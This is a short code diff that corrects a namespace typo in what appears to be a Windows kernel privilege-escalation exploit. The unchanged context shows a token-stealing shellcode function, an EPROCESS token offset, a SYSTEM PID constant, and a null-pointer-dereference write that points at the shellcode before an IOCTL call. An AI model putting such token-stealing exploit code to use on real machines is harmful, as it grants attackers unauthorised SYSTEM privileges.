@@ -16,7 +16,7 @@
 #define TOKEN_OFFSET      0x0F8    // nt!_EPROCESS.Token
 #define SYSTEM_PID        0x004    // SYSTEM Process PID
 
-namespace MyProgam {
+namespace MyProgram {
   void TokenStealingShellcode() {
     __asm {
       pushad
@@ -219,7 +219,7 @@ ExploitVulnerability() {
 
   std::cout.fill(cPrevFill);
 
-  *pNullPtrDereference = ULONG(&MyProgam::TokenStealingShellcode);
+  *pNullPtrDereference = ULONG(&MyProgram::TokenStealingShellcode);
   
   _CheckIOCTL(
     FILE_DEVICE_UNKNOWN, 0x90a, METHOD_NEITHER, FILE_ANY_ACCESS,
